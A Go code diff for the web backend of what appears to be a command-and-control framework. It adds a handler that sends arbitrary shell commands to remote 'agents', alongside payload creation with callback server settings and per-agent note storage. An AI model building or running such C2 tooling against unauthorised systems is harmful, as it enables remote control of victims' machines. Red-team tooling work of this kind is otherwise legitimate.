@@ -55,7 +55,7 @@ func GetOneAgentByUUID(c *gin.Context) {
     // Get agents by UUID
 	uuid := c.Param("agt")
 	fmt.Println("Trying to find agent", uuid)
-    agents, err := data.FetchOne(uuid)
+    agents, err := data.FetchOneAgent(uuid)
     if err != nil {
         c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to get agent"})
         return
@@ -65,11 +65,11 @@ func GetOneAgentByUUID(c *gin.Context) {
     return
 }
 
-func GetAgentByUUID(c *gin.Context) {
+func GetAgentCommandsByUUID(c *gin.Context) {
     // Get agents by UUID
 	uuid := c.Param("agt")
 	fmt.Println("Trying to find agent", uuid)
-    agents, err := data.Agent(uuid)
+    agents, err := data.GetAgentCommands(uuid)
     if err != nil {
         c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to get agent"})
         return
@@ -107,6 +107,21 @@ func UpdateAgentHandler(c *gin.Context) {
 		data.SendAgentCommand(agentParam, "0", "update", body["callbackfreq"]+":"+body["callbackjitter"], newCmdID)
 		c.JSON(http.StatusOK, gin.H{"message": "Success"})
 	}
+}
+
+func SendCommandHandler(c *gin.Context) {
+	agentParam := c.Param("agt")
+	newCmdID := uuid.New().String()
+
+	var body map[string]string
+	if err := c.BindJSON(&body); err != nil {
+		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid request body"})
+		return
+	}
+
+	command := body["command"]
+	data.SendAgentCommand(agentParam, "0", "shell", command, newCmdID)
+	c.JSON(http.StatusOK, gin.H{"message": "Success"})
 }
 
 func KillAgentHandler(c *gin.Context) {
@@ -240,5 +255,31 @@ func CreatePayloadHandler(c *gin.Context) {
 			data.CreatePayload(newPayID, body["name"], body["description"], body["serverip"], body["serverport"], body["callbackfrequency"], body["callbackjitter"], concat) // from web
 			c.JSON(http.StatusOK, gin.H{"data": "success"})
 		}
+	}
+}
+
+func GetNoteHandler (c *gin.Context) {
+	agentParam := c.Param("agt")
+	notes, err := data.GetAgentNotes(agentParam)
+	if err != nil {
+		c.JSON(http.StatusBadRequest, gin.H{"error": "Internal Server Error", "details": err.Error()})
+	} else {
+		c.JSON(http.StatusOK, gin.H{"data": notes})
+	}
+}
+
+func PutNoteHandler (c *gin.Context) {
+	agentParam := c.Param("agt")
+	var body map[string]string
+	if err := c.BindJSON(&body); err != nil {
+		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid request body"})
+		return
+	}
+	notes := body["notes"]
+	err := data.PutAgentNotes(agentParam, notes)
+	if err != nil {
+		c.JSON(http.StatusBadRequest, gin.H{"error": "Internal Server Error", "details": err.Error()})
+	} else {
+		c.JSON(http.StatusOK, gin.H{"message": "Success"})
 	}
 }
